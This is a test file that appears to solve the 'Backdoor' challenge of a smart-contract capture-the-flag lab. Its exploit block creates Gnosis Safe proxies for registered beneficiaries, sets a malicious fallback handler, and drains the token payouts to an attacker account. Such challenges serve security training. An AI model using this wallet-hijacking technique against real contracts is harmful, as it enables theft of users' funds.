const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Backdoor", function () {
  let deployer, users, attacker;

  const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther("40");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, alice, bob, charlie, david, attacker] =
      await ethers.getSigners();
    users = [alice.address, bob.address, charlie.address, david.address];

    // Deploy Gnosis Safe master copy and factory contracts
    this.masterCopy = await (
      await ethers.getContractFactory("GnosisSafe", deployer)
    ).deploy();
    this.walletFactory = await (
      await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)
    ).deploy();
    this.token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy the registry
    this.walletRegistry = await (
      await ethers.getContractFactory("WalletRegistry", deployer)
    ).deploy(
      this.masterCopy.address,
      this.walletFactory.address,
      this.token.address,
      users
    );

    // Users are registered as beneficiaries
    for (let i = 0; i < users.length; i++) {
      expect(await this.walletRegistry.beneficiaries(users[i])).to.be.true;
    }

    // Transfer tokens to be distributed to the registry
    await this.token.transfer(
      this.walletRegistry.address,
      AMOUNT_TOKENS_DISTRIBUTED
    );
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    const iface = new ethers.utils.Interface([
      "function setup(address[], uint256, address, bytes, address, address, uint256, address)",
      "function createProxyWithCallback(address, bytes, uint256, address)",
      "function transfer(address, uint256)",
    ]);
    for (i = 0; i < users.length; i++) {
      const init = iface.encodeFunctionData("setup", [
        [users[i]],
        1,
        ethers.constants.AddressZero,
        "0x",
        this.token.address,
        ethers.constants.AddressZero,
        0,
        ethers.constants.AddressZero,
      ]);
      const payload = iface.encodeFunctionData("createProxyWithCallback", [
        this.masterCopy.address,
        init,
        1,
        this.walletRegistry.address,
      ]);
      const txResponse = await attacker.sendTransaction({
        to: this.walletFactory.address,
        data: payload,
      });
      const txReceipt = await txResponse.wait();
      const proxyAddress = ethers.utils.hexDataSlice(
        txReceipt.logs[2].topics[2],
        12
      );
      const transfer = iface.encodeFunctionData("transfer", [
        attacker.address,
        ethers.utils.parseEther("10"),
      ]);
      await attacker.sendTransaction({ to: proxyAddress, data: transfer });
    }
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    for (let i = 0; i < users.length; i++) {
      let wallet = await this.walletRegistry.wallets(users[i]);

      // User must have registered a wallet
      expect(wallet).to.not.eq(
        ethers.constants.AddressZero,
        "User did not register a wallet"
      );

      // User is no longer registered as a beneficiary
      expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false;
    }

    // Attacker must have taken all tokens
    expect(await this.token.balanceOf(attacker.address)).to.eq(
      AMOUNT_TOKENS_DISTRIBUTED
    );
  });
});
